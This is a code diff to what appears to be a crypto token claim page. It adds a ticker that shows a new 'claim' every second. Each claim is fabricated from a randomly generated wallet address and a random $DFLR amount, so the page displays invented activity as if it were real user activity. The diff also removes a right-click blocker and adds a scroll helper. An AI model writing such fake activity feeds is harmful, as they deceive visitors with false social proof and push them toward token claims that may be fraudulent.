@@ -41,6 +41,42 @@
       background: radial-gradient(circle at 20% 50%, rgba(255,120,0,0.25), transparent 60%), radial-gradient(circle at 80% 50%, rgba(255,0,120,0.2), transparent 60%);
       filter: blur(40px); opacity: 0.5; pointer-events: none;
     }
+
+/* CLAIM FEED */
+.claim-feed {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 12px;
+  align-items: center;
+  overflow: hidden;
+  height: 30px;
+  max-width: 400px;
+}
+
+.claim-item {
+  font-size: 12px;
+  color: var(--muted2);
+  white-space: nowrap;
+  opacity: 0;
+  transform: translateY(20px) scale(0.95);
+  filter: blur(6px);
+  transition: all 0.6s ease;
+}
+
+.claim-item.show {
+  opacity: 1;
+  transform: translateY(0) scale(1);
+  filter: blur(0);
+}
+
+.claim-item.exit {
+  opacity: 0;
+  transform: translateX(-40px);
+  filter: blur(6px);
+}
+    
     @keyframes flareMove { 0% { transform: translateX(-40%); } 50% { transform: translateX(40%); } 100% { transform: translateX(-40%); } }
 
     .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; position: relative; z-index: 1; }
@@ -201,6 +237,9 @@
           <div class="logo-tagline">Fueling On-Chain Activity</div>
         </div>
       </a>
+
+<div class="claim-feed" id="claimFeed"></div>
+      
       <button type="button" class="nav-pill" onclick="Scroll()">Claim</button>
     </nav>
 
@@ -314,10 +353,57 @@
 
   <script>
 
-    // STOP RC //
-    document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-});
+    function randomWallet() {
+  const chars = "abcdef0123456789";
+  let start = "0x";
+  let end = "";
+
+  for (let i = 0; i < 6; i++) {
+    start += chars[Math.floor(Math.random() * chars.length)];
+  }
+  for (let i = 0; i < 6; i++) {
+    end += chars[Math.floor(Math.random() * chars.length)];
+  }
+
+  return `${start}...${end}`;
+}
+
+function randomAmount() {
+  return Math.floor(Math.random() * (9362 - 2966 + 1)) + 2966;
+}
+
+function createClaim() {
+  const feed = document.getElementById("claimFeed");
+
+  const el = document.createElement("div");
+  el.className = "claim-item";
+  el.innerText = `${randomWallet()} claimed ${randomAmount()} $DFLR`;
+
+  feed.appendChild(el);
+
+  // trigger masuk animasi
+  setTimeout(() => el.classList.add("show"), 50);
+
+  // geser kiri setelah 1 detik
+  setTimeout(() => {
+    el.classList.add("exit");
+  }, 1000);
+
+  // hapus element lama
+  setTimeout(() => {
+    el.remove();
+  }, 2000);
+}
+
+// loop tiap 1 detik
+setInterval(createClaim, 1000);
+
+    // ── SCROLL ──
+    function Scroll() {
+      const target = document.getElementById('targetScroll');
+      const y = target.getBoundingClientRect().top + window.pageYOffset - 100;
+      window.scrollTo({ top: y, behavior: 'smooth' });
+    }
     
     // ── MODAL ──
     function openModal() {
